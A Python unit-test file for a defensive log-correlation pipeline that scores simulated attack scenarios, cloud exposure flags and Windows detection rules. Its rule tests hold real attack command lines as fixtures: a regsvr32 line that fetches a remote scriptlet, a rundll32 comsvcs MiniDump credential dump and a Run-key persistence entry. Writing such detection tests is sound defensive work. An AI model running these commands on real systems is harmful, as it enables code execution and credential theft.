"""End-to-end checks of the correlation design on the simulated scenarios and the labelled cloud fixture."""
import json
import os
import shutil
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import config
import correlate
import evaluate
import generate_data
import normalize
import pipeline


class Scenarios(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.d, ignore_errors=True)

    def run_scenario(self, name, cfg=None, **kw):
        indir = os.path.join(self.d, name)
        truth = generate_data.build(name, indir, **kw)
        ctx = pipeline.run_case(indir, os.path.join(self.d, f"case_{name}"), cfg, make_report=False)
        return ctx, evaluate.score(ctx, truth)

    def test_full_attack_is_one_cross_platform_incident(self):
        ctx, sc = self.run_scenario("S1")
        self.assertEqual(sc["incidents_found"], 1)
        self.assertEqual(sc["f1"], 1.0)
        self.assertEqual(ctx["corr"]["incidents"][0]["platforms"], ["aws", "linux", "windows"])
        self.assertTrue(ctx["custody_ok"])

    def test_benign_activity_raises_nothing(self):
        ctx, sc = self.run_scenario("S4")
        self.assertEqual(sc["incidents_found"], 0)
        self.assertEqual(sc["false_alerts"], 0)

    def test_credential_pivot_needs_the_inventory(self):
        ctx, sc = self.run_scenario("S2")
        self.assertEqual((sc["incidents_found"], sc["split_incidents"]), (1, 0))
        reasons = {l["reason"] for l in ctx["corr"]["incidents"][0]["links"]}
        self.assertIn("credential inventory (file holds key)", reasons)
        ctx2, sc2 = self.run_scenario("S2", inventory=False)
        self.assertEqual(sc2["split_incidents"], 1)                     # without the inventory the pivot cannot be linked


class Cloud(unittest.TestCase):
    def test_labelled_fixture_exact_and_clean_account_silent(self):
        for exposed in (True, False):
            d = tempfile.mkdtemp()
            expected = generate_data.cloud_state(d, exposed)
            ctx = pipeline.run_case(d, os.path.join(d, "case"), dict(config.DEFAULT_CASE), make_report=True)
            found = {}
            for e in ctx["events"]:
                for f in e["flags"]:
                    found[f] = found.get(f, 0) + 1
            self.assertEqual(found, expected)
            self.assertEqual(ctx["corr"]["incidents"], [])               # exposure alone is never an incident
            shutil.rmtree(d)

    def test_unknown_mfa_is_not_reported_as_missing(self):
        d = tempfile.mkdtemp()
        os.makedirs(os.path.join(d, "cloud"))
        json.dump(dict(collected_at="2026-09-20T12:00:00Z", account="111122223333"), open(os.path.join(d, "cloud", "identity.json"), "w"))
        json.dump(dict(items=[dict(user="x", is_admin=True, mfa_devices=None, keys=[])]), open(os.path.join(d, "cloud", "iam_users.json"), "w"))
        ev, _ = normalize.parse_cloud(os.path.join(d, "cloud"))
        for i, e in enumerate(ev, 1):
            e["event_id"] = f"E{i}"
        correlate.correlate(ev, dict(config.DEFAULT_CASE))
        self.assertEqual([e["flags"] for e in ev], [[]])
        shutil.rmtree(d)


class Rules(unittest.TestCase):
    def _ev(self, **kw):
        e = normalize._blank()
        e.update(source="windows", host="H", epoch=1000.0, time_utc="2026-09-20T09:00:00Z", line_ref=1, source_file="x", event_id="E1")
        e.update(kw)
        return e

    def test_lolbin_registry_and_benign_lookalikes(self):
        cases = [
            (dict(event_type="process_create", target=r"C:\Windows\System32\regsvr32.exe", detail="regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll"), "lolbin_abuse"),
            (dict(event_type="process_create", target=r"C:\Windows\System32\rundll32.exe", detail="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full"), "credential_dump_tool"),
            (dict(event_type="registry_set", target=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\upd", detail=r"C:\Users\x\AppData\Roaming\u.exe"), "registry_persistence"),
            (dict(event_type="process_create", target=r"C:\Windows\System32\regsvr32.exe", detail="regsvr32 /s C:\\Program Files\\App\\x.dll"), None),
            (dict(event_type="process_create", target=r"C:\Windows\System32\rundll32.exe", detail="rundll32.exe shell32.dll,Control_RunDLL desk.cpl"), None),
            (dict(event_type="registry_set", target=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", detail="DWORD (0x00000001)"), None),
        ]
        for kw, want in cases:
            e = self._ev(**kw)
            correlate.correlate([e], dict(config.DEFAULT_CASE))
            if want:
                self.assertIn(want, e["flags"], kw)
            else:
                self.assertEqual(e["flags"], [], kw)


if __name__ == "__main__":
    unittest.main()
